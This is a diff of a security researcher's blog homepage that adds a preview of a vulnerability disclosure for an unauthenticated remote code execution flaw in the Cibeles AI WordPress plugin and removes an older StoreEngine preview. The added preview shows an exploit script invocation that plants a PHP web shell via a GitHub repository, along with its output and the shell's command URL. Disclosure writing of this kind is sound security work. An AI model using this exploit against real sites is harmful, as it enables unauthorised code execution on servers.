@@ -72,7 +72,7 @@
 <meta property="og:url" content="https://ryankozak.com/" />
 
 
-<meta property="og:updated_time" content="2025-12-04T00:02:00Z" />
+<meta property="og:updated_time" content="2025-12-05T00:01:00Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />
@@ -275,6 +275,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -295,6 +297,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-12673/">Flex QR Code Generator &lt;= 1.2.6 - Unauthenticated Arbitrary File Upload</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
                             </li>
                         
@@ -310,10 +316,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-13597/">AI Feeds &lt;= 1.0.11 - Unauthenticated Arbitrary File Upload</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-13595/">CIBELES AI &lt;= 1.10.8 - Unauthenticated Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -322,6 +324,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -423,6 +427,86 @@
                 <div class="posts">
     
     
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-13595/">CIBELES AI &lt;= 1.10.8 - Unauthenticated Arbitrary File Upload</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-11-25T00:00:00Z" class="post-date">
+        November 25, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-CIBELES AI">
+        <a href="https://ryankozak.com/tags/cibeles-ai">CIBELES AI</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-13595">CVE-2025-13595</h3>
+<h2 id="summary">Summary</h2>
+<p>The <a href="https://wordpress.org/plugins/cibeles-ai/" target="_blank">Cibeles AI</a> WordPress plugin versions 1.10.8 and below contain an unauthenticated remote code execution vulnerability in the <code>actualizador_git.php</code> file. This file is directly accessible via HTTP without any authentication or authorization checks, allowing unauthenticated attackers to download arbitrary GitHub repositories and overwrite plugin files, leading to remote code execution.</p>
+<h2 id="tldr-exploits">TL;DR Exploits</h2>
+<p>A <a href="https://github.com/d0n601/CVE-2025-13595/blob/master/CVE-2025-13595.py" target="_blank">CVE-2025-13595.py</a> is provided to demonstrate a remote attacker uploading <code>shell.php</code> and executing remote code:</p>
+<pre tabindex="0"><code>python3 CVE-2025-13595.py -t http://techcorp.cc -o d0n601 -r minimal-rce -k github_pat_YOURKEY -c whoami
+[*] Exploiting actualizador_git.php vulnerability...
+[*] Downloading and installing shell from GitHub repository: d0n601/minimal-rce
+Descargando d0n601/minimal-rce@main ...
+Eliminando entradas extra...
+Copiando archivos...
+OK. Mirror aplicado en: /var/www/html/wp-content/plugins/cibeles-ai
+
+[*] Exploit executed. Checking if shell.php was created...
+
+[*] Testing shell access...
+www-data
+
+
+[*] Shell should be accessible at:
+    http://techcorp.cc/wp-content/plugins/cibeles-ai/shell.php?cmd=COMMAND
+</code></pre><h2 id="technical-analysis">Technical Analysis</h2>
+<p>The vulnerability exists in <code>/wp-content/plugins/cibeles-ai/actualizador_git.php</code>. This file implements a GitHub repository mirroring system that can be accessed directly via HTTP without any security controls.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-13595/">Read More…</a>
+        </div>
+        
+        
+    </article>
     <article class="post">
         <div class="info">
   <h1 class="post-title">
@@ -717,65 +801,6 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
         
         <div class="read-more-link">
             <a href="/posts/cve-2025-12399/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2025-9216/">StoreEngine – Powerful WordPress eCommerce Plugin for Payments, Memberships, Affiliates, Sales &amp; More &lt;= 1.4.0 - Authenticated (Subscriber&#43;) Arbitrary File Upload</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2025-09-16T00:01:00Z" class="post-date">
-        September 16, 2025
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-    <ul class="tags">
-      
-      <li class="tag-CVE">
-        <a href="https://ryankozak.com/tags/cve">CVE</a>
-      </li>
-      
-      <li class="tag-WordPress">
-        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
-      </li>
-      
-      <li class="tag-StoreEngine">
-        <a href="https://ryankozak.com/tags/storeengine">StoreEngine</a>
-      </li>
-      
-    </ul>
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <h3 id="cve-2025-9216">CVE-2025-9216</h3>
-<p>The <a href="https://wordpress.org/plugins/storeengine/" target="_blank">StoreEngine</a> plugin contains a vulnerability in it&rsquo;s CSV Import/Export feature that allows <strong>any authenticated user</strong> (subscriber, author, editor, etc.) to upload arbitrary files and gain remote code execution. The vulnerability stems from two security flaws: (1) the CSV import endpoint lacks proper file validation checks, permission checks, and only relies on nonce verification for security, and (2) the <code>storeengine_nonce</code> is exposed to <strong>ALL frontend users</strong> through the plugin&rsquo;s JavaScript. This combination allows any authenticated user to extract the nonce from frontend pages and use it to upload PHP web shells via the <code>storeengine_csv/import</code> endpoint, effectively granting subscriber+ users the ability to execute arbitrary code on the server.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2025-9216/">Read More…</a>
         </div>
         
         
